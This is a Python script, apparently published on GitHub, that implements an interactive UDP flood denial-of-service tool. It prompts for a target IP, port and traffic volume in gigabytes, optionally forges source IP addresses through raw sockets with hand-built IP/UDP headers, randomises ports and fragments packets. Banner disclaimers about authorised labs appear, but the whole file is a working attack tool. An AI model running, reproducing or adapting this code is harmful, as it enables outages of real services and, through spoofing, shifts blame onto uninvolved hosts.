#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import ipaddress
import random
import struct
import platform


# ==================== Cross-platform clear screen ====================
def clear_screen():
    # Clear screen, compatible with Windows (cls) and Unix-like (clear)
    os.system('cls' if os.name == 'nt' else 'clear')


# ==================== Checksum computation ====================
def ip_checksum(data: bytes) -> int:
    # Standard 16-bit one's complement checksum (RFC 1071)
    # Used for IP header or UDP pseudo-header + UDP header + payload
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def udp_checksum(src_ip: str, dst_ip: str, udp_header: bytes, payload: bytes) -> int:
    # UDP checksum needs pseudo-header (src + dst + zero + proto + udp_len)
    # The udp_header must have its checksum field set to 0 on input
    pseudo = (socket.inet_aton(src_ip) +
              socket.inet_aton(dst_ip) +
              b'\x00\x11' +
              struct.pack('!H', len(udp_header) + len(payload)))
    result = ip_checksum(pseudo + udp_header + payload)
    # UDP checksum 0 means "not computed"; receivers skip validation
    # To avoid being dropped by firewalls/conntrack, use 0xFFFF when result is 0
    return result if result != 0 else 0xFFFF


# ==================== Local network detection ====================
def get_local_ip_and_subnet():
    # Probe local egress IP via UDP connect (no actual packets sent)
    # Returns (ip_str, ip_network), or (None, None) on failure
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        # Assume /24 — most conservative estimate; precise subnet needs netifaces
        net = ipaddress.ip_network(f"{local_ip}/24", strict=False)
        return local_ip, net
    except Exception:
        return None, None


# ==================== Spoof IP validation ====================
def validate_spoof_ip(spoof_ip: str, target_ip: str, local_net) -> tuple:
    # Returns (is_valid, message)
    # message may be a warning (still allowed) or a rejection reason
    try:
        s = ipaddress.ip_address(spoof_ip)
        t = ipaddress.ip_address(target_ip)
    except ValueError:
        return False, "Invalid IP address"

    if not isinstance(s, ipaddress.IPv4Address):
        return False, "Only IPv4 spoofing supported"

    if s.is_loopback:
        return False, f"Reject {spoof_ip}: loopback (127.0.0.0/8)"
    if s.is_multicast:
        return False, f"Reject {spoof_ip}: multicast (224.0.0.0/4)"
    if s.is_unspecified:
        return False, f"Reject {spoof_ip}: 0.0.0.0 is meaningless"
    if s.is_reserved:
        return False, f"Reject {spoof_ip}: reserved (240.0.0.0/4)"
    if s.is_link_local:
        return False, f"Reject {spoof_ip}: link-local (169.254.0.0/16)"
    if s == t:
        return False, "Reject: spoof IP must not equal target IP"
    if s.is_private and local_net and s not in local_net:
        return True, (f"Warning: {spoof_ip} is private but outside local subnet {local_net}; "
                      f"cross-route spoofing will be filtered by upstream uRPF, likely ineffective")

    if local_net and s not in local_net:
        return True, (f"Warning: {spoof_ip} is outside local subnet {local_net}; "
                      f"cross-route spoofing will be filtered by upstream uRPF, likely ineffective")

    return True, f"OK: {spoof_ip} is within local subnet {local_net} (best-case)"


# ==================== Build IP + UDP packet ====================
def build_ip_udp_packet(spoof_ip: str, target_ip: str,
                        src_port: int, dst_port: int,
                        payload: bytes, ttl: int = 64) -> bytes:
    # Build a complete IPv4 + UDP packet with correct checksums
    # DF bit forced (no fragmentation), so payload must be <= 1472 bytes
    ip_header_len = 20
    udp_header_len = 8
    total_len = ip_header_len + udp_header_len + len(payload)

    # IP header fields
    ip_ver_ihl = 0x45                      # IPv4, IHL=5 (20 bytes)
    ip_tos = 0
    ip_id = random.randint(0, 0xFFFF)
    ip_frag_off = 0x4000                   # DF=1, MF=0, offset=0
    ip_ttl = ttl
    ip_proto = socket.IPPROTO_UDP
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)

    # Pass 1: checksum=0, compute
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, ip_tos, total_len,
                            ip_id, ip_frag_off,
                            ip_ttl, ip_proto, 0,
                            ip_saddr, ip_daddr)
    ip_check = ip_checksum(ip_header)

    # Pass 2: fill in correct checksum
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, ip_tos, total_len,
                            ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)

    # UDP header
    udp_len = udp_header_len + len(payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    udp_check = udp_checksum(spoof_ip, target_ip, udp_header, payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_check)

    return ip_header + udp_header + payload


# ==================== TCP reachability check ====================
def check_target(ip: str, port: int, timeout: float = 1.0) -> bool:
    # Simple TCP connection test
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ==================== Banner ====================
def show_banner():
    clear_screen()
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
    print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("==================== SEVERE WARNING =====================")
    print("You are crossing the legal and ethical boundary. Exit now, or wait 3s.")
    print("Authorized isolated lab environments only.")
    print("=========================================================")
    time.sleep(1)
    print("3"); time.sleep(1)
    print("2"); time.sleep(1)
    print("1"); time.sleep(1)
    print("Starting...")
    time.sleep(1)

    clear_screen()
    ret = os.system("figlet DDOS-Attack 2>/dev/null" if os.name != 'nt' else "figlet DDOS-Attack 2>nul")
    if ret != 0:
        print(r" ____  ____   ___  ____          _   _   _             _     ")
        print(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
        print(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
        print(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
        print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")
    print("==================================================================")
    print("Author  : Su-StackTrace")
    print("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
    print("==================================================================")
    print("")


# ==================== Main ====================
def main():
    show_banner()

    # Target IP
    while True:
        try:
            ip_str = input("[?] Target IP: ").strip()
            ipaddress.ip_address(ip_str)
            target_ip = ip_str
            break
        except ValueError:
            print("[!] Invalid IP, retry")

    # Target port
    while True:
        try:
            port_str = input("[?] Target port: ").strip()
            target_port = int(port_str)
            if 1 <= target_port <= 65535:
                break
            print("[!] Port must be in 1-65535")
        except ValueError:
            print("[!] Invalid port")

    # Total traffic
    while True:
        try:
            gb_str = input("[?] Total traffic (GB): ").strip()
            total_gb = float(gb_str)
            if total_gb > 0:
                break
            print("[!] Traffic must be > 0 GB")
        except ValueError:
            print("[!] Invalid number")

    # Rate limit
    rate_limit = 0.0
    try:
        rate_str = input("[?] Packet interval (sec, 0=unlimited): ").strip()
        if rate_str:
            rate_limit = float(rate_str)
    except ValueError:
        rate_limit = 0.0

    # Spoof source IP
    print("\n--- Source IP mode ---")
    print("[*] Empty = use real local source IP (plain UDP)")
    print("[*] Enter IP = spoof that IP (requires root / admin)")
    spoof_ip = input("[?] Spoof source IP: ").strip()

    local_ip, local_net = get_local_ip_and_subnet()
    if local_ip:
        print(f"[>] Local egress IP: {local_ip}, guessed subnet: {local_net}")
    else:
        print("[>] Cannot detect local subnet, uRPF check will be skipped")

    if spoof_ip:
        valid, msg = validate_spoof_ip(spoof_ip, target_ip, local_net)
        if not valid:
            print(f"[!] {msg}")
            print("[!] Spoof rejected, exiting")
            sys.exit(1)
        print(f"[>] {msg}")

        # Spoof-mode parameters
        ttl = 64
        try:
            ttl_str = input("[?] TTL (default 64): ").strip()
            if ttl_str:
                ttl = int(ttl_str)
                if not 1 <= ttl <= 255:
                    ttl = 64
        except ValueError:
            ttl = 64

        # Forced DF, payload max 1472
        PACKET_SIZE = 1472
        try:
            size_str = input("[?] Packet size (bytes, default 1472, max 1472 in DF mode): ").strip()
            if size_str:
                PACKET_SIZE = int(size_str)
                if PACKET_SIZE > 1472:
                    print(f"[!] DF mode caps payload at 1472, truncated")
                    PACKET_SIZE = 1472
                if PACKET_SIZE < 28:
                    PACKET_SIZE = 28
        except ValueError:
            pass

        use_spoof = True
        use_fragmentation = False
        random_target_port = False
        source_port = None

        rnd = input("[?] Randomize target port? (y/N): ").strip().lower()
        if rnd == 'y':
            random_target_port = True

        print(f"\n[>] Spoof mode:")
        print(f"    Spoof source IP : {spoof_ip}")
        print(f"    TTL             : {ttl}")
        print(f"    Packet size     : {PACKET_SIZE} bytes (DF bit on)")

    else:
        use_spoof = False
        ttl = 64

        src = input("[?] Source port (empty = system random): ").strip()
        source_port = int(src) if src else None

        frag = input("[?] Enable IP fragmentation? (y/N): ").strip().lower()
        use_fragmentation = (frag == 'y')

        rnd = input("[?] Use random target port? (y/N): ").strip().lower()
        random_target_port = (rnd == 'y')

        PACKET_SIZE = 3000 if use_fragmentation else 1472
        print(f"\n[>] Plain mode:")
        print(f"    Packet size     : {PACKET_SIZE} bytes")

    total_bytes = int(total_gb * 1024 * 1024 * 1024)
    max_packets = total_bytes // PACKET_SIZE

    # Summary
    print(f"\n[>] Will send {max_packets} packets, {total_gb:.2f} GB total")
    if rate_limit > 0:
        print(f"[>] Packet interval: {rate_limit} sec")
    if use_spoof:
        print(f"[>] Raw socket mode (requires root / admin)")
    else:
        print(f"[>] Plain UDP mode")
    if random_target_port:
        print(f"[>] Random target port: ON")

    # Reachability check (plain mode only)
    if not use_spoof:
        print("[>] Checking target reachability (TCP)...")
        if not check_target(target_ip, target_port):
            print("[!] TCP unreachable (note: TCP reachable != UDP reachable)")
            choice = input("[?] Continue anyway? (y/N): ").strip().lower()
            if choice != 'y':
                print("[>] Cancelled")
                sys.exit(0)

    # Final confirmation
    print("\n[!] Final warning: you are about to send a large UDP flood.")
    print("[!] Confirm this is a device you fully own and have authorization for.")
    confirm = input("[?] Confirm (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("[>] Cancelled")
        sys.exit(0)

    # Create socket
    if use_spoof:
        if platform.system() == "Windows":
            print("[>] On Windows, raw sockets require Administrator privileges")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            print("[!] Raw socket creation failed; run with sudo / root / Administrator")
            sys.exit(1)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if source_port is not None:
            try:
                sock.bind(('', source_port))
            except OSError as e:
                print(f"[!] Cannot bind source port {source_port}: {e}")
                sock.close()
                sys.exit(1)
        if use_fragmentation:
            try:
                if hasattr(socket, 'IP_MTU_DISCOVER'):
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
                    if hasattr(socket, 'IP_DONTFRAGMENT'):
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
            except (AttributeError, OSError) as e:
                print(f"[!] Enabling fragmentation failed ({e}), falling back to plain mode")
                PACKET_SIZE = 1472
                total_bytes = int(total_gb * 1024 * 1024 * 1024)
                max_packets = total_bytes // PACKET_SIZE

    payload = os.urandom(PACKET_SIZE)
    sent = 0
    sent_bytes = 0
    next_mb = 1024 * 1024
    start_time = time.time()

    print(f"\n[>] Sending... (Ctrl+C to stop)")

    try:
        while sent < max_packets:
            if random_target_port:
                current_port = random.randint(1, 65535)
            else:
                current_port = target_port

            try:
                if use_spoof:
                    src_port = source_port if source_port else random.randint(1024, 65535)
                    packet = build_ip_udp_packet(
                        spoof_ip, target_ip,
                        src_port, current_port,
                        payload, ttl
                    )
                    # IP_HDRINCL ignores port; passing 0 is more correct
                    sock.sendto(packet, (target_ip, 0))
                else:
                    sock.sendto(payload, (target_ip, current_port))

                sent += 1
                sent_bytes += PACKET_SIZE

                if not random_target_port and not use_spoof:
                    target_port += 1
                    if target_port > 65534:
                        target_port = 1

            except OSError as e:
                print(f"[!] Send error: {e}")

            if sent_bytes >= next_mb:
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                mb = sent_bytes / (1024 * 1024)
                print(f"[>] Sent: {sent} packets ({mb:.2f} MB) | Elapsed: {elapsed:.1f}s | Rate: {pps:.1f} pps")
                next_mb += 1024 * 1024

            if rate_limit > 0:
                time.sleep(rate_limit)

    except KeyboardInterrupt:
        print("\n[!] User interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        sock.close()
        elapsed = time.time() - start_time
        print(f"\n[>] Done. Total packets: {sent}, total data: {sent_bytes / (1024*1024):.2f} MB, elapsed: {elapsed:.2f}s")


if __name__ == "__main__":
    main()
